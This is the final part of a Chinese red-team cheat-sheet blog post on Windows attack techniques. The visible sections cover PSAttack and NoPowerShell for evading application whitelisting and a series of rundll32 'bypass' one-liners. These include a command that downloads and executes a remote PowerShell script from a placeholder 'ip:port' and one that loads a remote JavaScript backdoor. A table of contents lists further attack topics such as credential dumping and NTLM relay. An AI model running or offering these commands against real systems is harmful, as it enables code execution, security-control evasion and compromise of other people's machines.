<h2 id="9-7-PSAttack"><a href="#9-7-PSAttack" class="headerlink" title="9.7 PSAttack"></a>9.7 PSAttack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jaredhaight/PSAttack</span><br><span class="line"></span><br><span class="line">Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.</span><br><span class="line"></span><br><span class="line">Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)</span><br></pre></td></tr></table></figure>

<h2 id="9-8-NoPowerShell"><a href="#9-8-NoPowerShell" class="headerlink" title="9.8 NoPowerShell"></a>9.8 NoPowerShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/bitsadmin/nopowershell</span><br><span class="line"></span><br><span class="line">Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.</span><br></pre></td></tr></table></figure>

<h2 id="9-9-runDLL32绕过"><a href="#9-9-runDLL32绕过" class="headerlink" title="9.9 runDLL32绕过"></a>9.9 runDLL32绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</span><br><span class="line"></span><br><span class="line">rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exe</span><br><span class="line"></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL payload.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)</span><br></pre></td></tr></table></figure>

<hr></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">madcoding</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mad-coding.cn/2019/10/11/Windows-Notes/">https://www.mad-coding.cn/2019/10/11/Windows-Notes/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mad-coding.cn">madcoding’s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/翻译文章/">翻译文章    </a><a class="post-meta__tags" href="/tags/Windows/">Windows    </a></div><div class="post_share"><div class="social-share" data-image="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2083938188,947746588&amp;fm=26&amp;gp=0.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-buttom"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/wechat.jpg"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/alipay.jpg"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull-left"><a href="/2019/10/11/使用docker安装移动安全框架（MobSF）/"><img class="prev_cover lozad" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164700.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>使用docker安装移动安全框架（MobSF）</span></div></a></div><div class="next-post pull-right"><a href="/2019/10/11/Linux Notes/"><img class="next_cover lozad" data-src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2083938188,947746588&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>Linux Notes</span></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;

window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'G4KVNWBtXJxgbEwcA9QMJGVo-gzGzoHsz',
  appKey:'E8XbTUIA04PSPKW9rGpkjYg3',
  placeholder:'Please leave your footprints',
  avatar:'monsterid',
  guest_info:guest_info,
  pageSize:'10',
  lang:'en',
  recordIP: true
});</script></div></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 By madcoding</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi，welcome to madcoding's <a href="https://www.mad-coding.cn/">blog</a></div><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action"><span>皖ICP备17023740号</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><section class="rightside" id="rightside"><i class="fa fa-book" id="readmode" title="阅读模式"> </i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="fa fa-moon-o nightshift" id="nightshift" title="夜间模式"></i></section><div id="post_bottom"><div id="post_bottom_items"><a id="to_comment" href="#post-comment"><i class="scroll_to_comment fa fa-comments"></i></a><i class="fa fa-list" id="mobile_toc"></i><div id="toc_mobile"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x00-前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">0x00 前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x01-列举"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">0x01 列举</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#1-1-基本命令"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">1.1 基本命令</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-1-具有SPN的用户"><span class="toc_mobile_items-number">2.1.1.</span> <span class="toc_mobile_items-text">1.1.1 具有SPN的用户</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-2-Kerberos枚举"><span class="toc_mobile_items-number">2.1.2.</span> <span class="toc_mobile_items-text">1.1.2 Kerberos枚举</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-3-红队CSharp脚本"><span class="toc_mobile_items-number">2.1.3.</span> <span class="toc_mobile_items-text">1.1.3 红队CSharp脚本</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-4-活动目录"><span class="toc_mobile_items-number">2.1.4.</span> <span class="toc_mobile_items-text">1.1.4 活动目录</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-5-从Linux-Box进行AD枚举-AD工具"><span class="toc_mobile_items-number">2.1.5.</span> <span class="toc_mobile_items-text">1.1.5 从Linux Box进行AD枚举-AD工具</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-6-SharpView枚举"><span class="toc_mobile_items-number">2.1.6.</span> <span class="toc_mobile_items-text">1.1.6 SharpView枚举</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-7-SMB枚举"><span class="toc_mobile_items-number">2.1.7.</span> <span class="toc_mobile_items-text">1.1.7 SMB枚举</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-8-SNMP枚举"><span class="toc_mobile_items-number">2.1.8.</span> <span class="toc_mobile_items-text">1.1.8 SNMP枚举</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-9-MySQL枚举"><span class="toc_mobile_items-number">2.1.9.</span> <span class="toc_mobile_items-text">1.1.9 MySQL枚举</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-10-DNS区域转移"><span class="toc_mobile_items-number">2.1.10.</span> <span class="toc_mobile_items-text">1.1.10 DNS区域转移</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-11-LDAP"><span class="toc_mobile_items-number">2.1.11.</span> <span class="toc_mobile_items-text">1.1.11 LDAP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-12-RPC枚举"><span class="toc_mobile_items-number">2.1.12.</span> <span class="toc_mobile_items-text">1.1.12 RPC枚举</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-13-远程桌面"><span class="toc_mobile_items-number">2.1.13.</span> <span class="toc_mobile_items-text">1.1.13 远程桌面</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x02-文件传输"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x02 文件传输</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-1-TFTP"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">2.1 TFTP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-2-FTP"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">2.2 FTP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-3-VBS-Script"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">2.3 VBS Script</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-4-Powershell"><span class="toc_mobile_items-number">3.4.</span> <span class="toc_mobile_items-text">2.4 Powershell</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-5-Powershell-Base64"><span class="toc_mobile_items-number">3.5.</span> <span class="toc_mobile_items-text">2.5 Powershell Base64</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-6-安全复制-pscp-exe"><span class="toc_mobile_items-number">3.6.</span> <span class="toc_mobile_items-text">2.6 安全复制/ pscp.exe</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-7-BitsAdmin-exe"><span class="toc_mobile_items-number">3.7.</span> <span class="toc_mobile_items-text">2.7 BitsAdmin.exe</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-8-Remote-Desktop"><span class="toc_mobile_items-number">3.8.</span> <span class="toc_mobile_items-text">2.8 Remote Desktop</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-9-WinHTTP-Com-Object"><span class="toc_mobile_items-number">3.9.</span> <span class="toc_mobile_items-text">2.9 WinHTTP Com Object</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-10-CertUtil"><span class="toc_mobile_items-number">3.10.</span> <span class="toc_mobile_items-text">2.10 CertUtil</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-11-Curl-Windows-1803"><span class="toc_mobile_items-number">3.11.</span> <span class="toc_mobile_items-text">2.11 Curl (Windows 1803+)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-12-SMB"><span class="toc_mobile_items-number">3.12.</span> <span class="toc_mobile_items-text">2.12 SMB</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x03-exploit"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x03 exploit</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-1-LLMNR-NBT-NS欺骗"><span class="toc_mobile_items-number">4.1.</span> <span class="toc_mobile_items-text">3.1 LLMNR / NBT-NS欺骗</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-2-Responder-WPAD-Attack"><span class="toc_mobile_items-number">4.2.</span> <span class="toc_mobile_items-text">3.2 Responder WPAD Attack</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-3-mitm6"><span class="toc_mobile_items-number">4.3.</span> <span class="toc_mobile_items-text">3.3 mitm6</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-4-SCF文件攻击"><span class="toc_mobile_items-number">4.4.</span> <span class="toc_mobile_items-text">3.4 SCF文件攻击</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-5-NTLM-Relay"><span class="toc_mobile_items-number">4.5.</span> <span class="toc_mobile_items-text">3.5 NTLM-Relay</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-6-私下交易"><span class="toc_mobile_items-number">4.6.</span> <span class="toc_mobile_items-text">3.6 私下交易</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-7-Exchange-Password-Spray"><span class="toc_mobile_items-number">4.7.</span> <span class="toc_mobile_items-text">3.7 Exchange Password Spray</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-8-ExchangeRelayX"><span class="toc_mobile_items-number">4.8.</span> <span class="toc_mobile_items-text">3.8 ExchangeRelayX</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-9-Exchange-Mailbox-Post-Compromise"><span class="toc_mobile_items-number">4.9.</span> <span class="toc_mobile_items-text">3.9 Exchange Mailbox Post-Compromise</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-10-CrackMapExec"><span class="toc_mobile_items-number">4.10.</span> <span class="toc_mobile_items-text">3.10 CrackMapExec</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-11-邮件狙击手"><span class="toc_mobile_items-number">4.11.</span> <span class="toc_mobile_items-text">3.11 邮件狙击手</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-12-Kerberos-Stuff"><span class="toc_mobile_items-number">4.12.</span> <span class="toc_mobile_items-text">3.12 Kerberos Stuff</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-13-MSSQL利用（PowerUpSQL）"><span class="toc_mobile_items-number">4.13.</span> <span class="toc_mobile_items-text">3.13 MSSQL利用（PowerUpSQL）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-14-Malicious-Macro-with-MSBuild"><span class="toc_mobile_items-number">4.14.</span> <span class="toc_mobile_items-text">3.14 Malicious Macro with MSBuild</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-15-WeirdHTA-Undetectable-HTA"><span class="toc_mobile_items-number">4.15.</span> <span class="toc_mobile_items-text">3.15 WeirdHTA - Undetectable HTA</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-16-EvilWinRM"><span class="toc_mobile_items-number">4.16.</span> <span class="toc_mobile_items-text">3.16 EvilWinRM</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#3-17-Meterpreter-Donut-Shellcode注入-NET"><span class="toc_mobile_items-number">4.17.</span> <span class="toc_mobile_items-text">3.17 Meterpreter + Donut-Shellcode注入.NET</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x04-特权提升"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">0x04 特权提升</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-1-基本命令"><span class="toc_mobile_items-number">5.1.</span> <span class="toc_mobile_items-text">4.1 基本命令</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-2-PowerUp-ps1（有时是快速获胜）"><span class="toc_mobile_items-number">5.2.</span> <span class="toc_mobile_items-text">4.2 PowerUp.ps1（有时是快速获胜）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-3-锐化"><span class="toc_mobile_items-number">5.3.</span> <span class="toc_mobile_items-text">4.3 锐化</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-4-如果是公元，引进猎狗犬…"><span class="toc_mobile_items-number">5.4.</span> <span class="toc_mobile_items-text">4.4  如果是公元，引进猎狗犬…</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-5-Bloodhound-Python"><span class="toc_mobile_items-number">5.5.</span> <span class="toc_mobile_items-text">4.5 Bloodhound-Python</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-6-明文密码"><span class="toc_mobile_items-number">5.6.</span> <span class="toc_mobile_items-text">4.6 明文密码</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-7-查看已安装的软件"><span class="toc_mobile_items-number">5.7.</span> <span class="toc_mobile_items-text">4.7 查看已安装的软件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-8-弱文件夹权限"><span class="toc_mobile_items-number">5.8.</span> <span class="toc_mobile_items-text">4.8 弱文件夹权限</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-9-计划任务"><span class="toc_mobile_items-number">5.9.</span> <span class="toc_mobile_items-text">4.9 计划任务</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-10-Powershell历史"><span class="toc_mobile_items-number">5.10.</span> <span class="toc_mobile_items-text">4.10 Powershell历史</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-12-查看已连接的驱动器"><span class="toc_mobile_items-number">5.11.</span> <span class="toc_mobile_items-text">4.12 查看已连接的驱动器</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-13-查看隐私"><span class="toc_mobile_items-number">5.12.</span> <span class="toc_mobile_items-text">4.13 查看隐私</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-14-还有其他人登录吗？"><span class="toc_mobile_items-number">5.13.</span> <span class="toc_mobile_items-text">4.14 还有其他人登录吗？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-15-查看注册表自动登录"><span class="toc_mobile_items-number">5.14.</span> <span class="toc_mobile_items-text">4.15 查看注册表自动登录</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-16-在凭据管理器中查看存储的凭据"><span class="toc_mobile_items-number">5.15.</span> <span class="toc_mobile_items-text">4.16 在凭据管理器中查看存储的凭据</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-17-查看未引用的服务路径"><span class="toc_mobile_items-number">5.16.</span> <span class="toc_mobile_items-text">4.17 查看未引用的服务路径</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-18-查看启动项"><span class="toc_mobile_items-number">5.17.</span> <span class="toc_mobile_items-text">4.18 查看启动项</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-19-检查AlwaysInstalledElevated注册表项"><span class="toc_mobile_items-number">5.18.</span> <span class="toc_mobile_items-text">4.19 检查AlwaysInstalledElevated注册表项</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-20-注册表中有密码吗？"><span class="toc_mobile_items-number">5.19.</span> <span class="toc_mobile_items-text">4.20 注册表中有密码吗？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-21-剩余的任何Sysrep或无人参与文件"><span class="toc_mobile_items-number">5.20.</span> <span class="toc_mobile_items-text">4.21 剩余的任何Sysrep或无人参与文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-22-GPP（组策略首选项）密码"><span class="toc_mobile_items-number">5.21.</span> <span class="toc_mobile_items-text">4.22 GPP（组策略首选项）密码</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-23-转储Chrome密码（也发布漏洞利用程序）"><span class="toc_mobile_items-number">5.22.</span> <span class="toc_mobile_items-text">4.23 转储Chrome密码（也发布漏洞利用程序）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-24-转储KeePass"><span class="toc_mobile_items-number">5.23.</span> <span class="toc_mobile_items-text">4.24 转储KeePass</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-25-令牌模拟"><span class="toc_mobile_items-number">5.24.</span> <span class="toc_mobile_items-text">4.25 令牌模拟</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-26-多汁土豆"><span class="toc_mobile_items-number">5.25.</span> <span class="toc_mobile_items-text">4.26 多汁土豆</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-27-烧烤"><span class="toc_mobile_items-number">5.26.</span> <span class="toc_mobile_items-text">4.27 烧烤</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-28-用Python编写的"><span class="toc_mobile_items-number">5.27.</span> <span class="toc_mobile_items-text">4.28 用Python编写的</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-29-代表烘焙"><span class="toc_mobile_items-number">5.28.</span> <span class="toc_mobile_items-text">4.29 代表烘焙</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#4-30DCSync（也用于后期利用）"><span class="toc_mobile_items-number">5.29.</span> <span class="toc_mobile_items-text">4.30DCSync（也用于后期利用）</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x05-exploit后"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">0x05 exploit后</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-1-有用的命令"><span class="toc_mobile_items-number">6.1.</span> <span class="toc_mobile_items-text">5.1 有用的命令</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-2-Esenutl-exe转储锁定文件"><span class="toc_mobile_items-number">6.2.</span> <span class="toc_mobile_items-text">5.2 Esenutl.exe转储锁定文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-3-检查是否已启用Powershell日志记录"><span class="toc_mobile_items-number">6.3.</span> <span class="toc_mobile_items-text">5.3 检查是否已启用Powershell日志记录</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-4-Run-Seatbelt（绝对必须）"><span class="toc_mobile_items-number">6.4.</span> <span class="toc_mobile_items-text">5.4 Run Seatbelt（绝对必须）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-5-Dump-Creds"><span class="toc_mobile_items-number">6.5.</span> <span class="toc_mobile_items-text">5.5 Dump Creds</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-6-Dump-Creds-2"><span class="toc_mobile_items-number">6.6.</span> <span class="toc_mobile_items-text">5.6 Dump Creds #2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-7-SessionGopher"><span class="toc_mobile_items-number">6.7.</span> <span class="toc_mobile_items-text">5.7 SessionGopher</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）"><span class="toc_mobile_items-number">6.8.</span> <span class="toc_mobile_items-text">5.8 Dump Chrome密码（也发布漏洞利用程序）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-9-Dump-Process-Memory-w-Mimikittenz"><span class="toc_mobile_items-number">6.9.</span> <span class="toc_mobile_items-text">5.9 Dump Process Memory w/ Mimikittenz</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-10-Dump-KeePass"><span class="toc_mobile_items-number">6.10.</span> <span class="toc_mobile_items-text">5.10 Dump KeePass</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-11-pypykatz"><span class="toc_mobile_items-number">6.11.</span> <span class="toc_mobile_items-text">5.11 pypykatz</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-12-SafetyKatz"><span class="toc_mobile_items-number">6.12.</span> <span class="toc_mobile_items-text">5.12 SafetyKatz</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-13-SharpDPAPI"><span class="toc_mobile_items-number">6.13.</span> <span class="toc_mobile_items-text">5.13 SharpDPAPI</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-14-SharpSniper"><span class="toc_mobile_items-number">6.14.</span> <span class="toc_mobile_items-text">5.14 SharpSniper</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-15-SharpLocker"><span class="toc_mobile_items-number">6.15.</span> <span class="toc_mobile_items-text">5.15 SharpLocker</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-16-Check-for-Missing-KB’s"><span class="toc_mobile_items-number">6.16.</span> <span class="toc_mobile_items-text">5.16 Check for Missing KB’s</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" 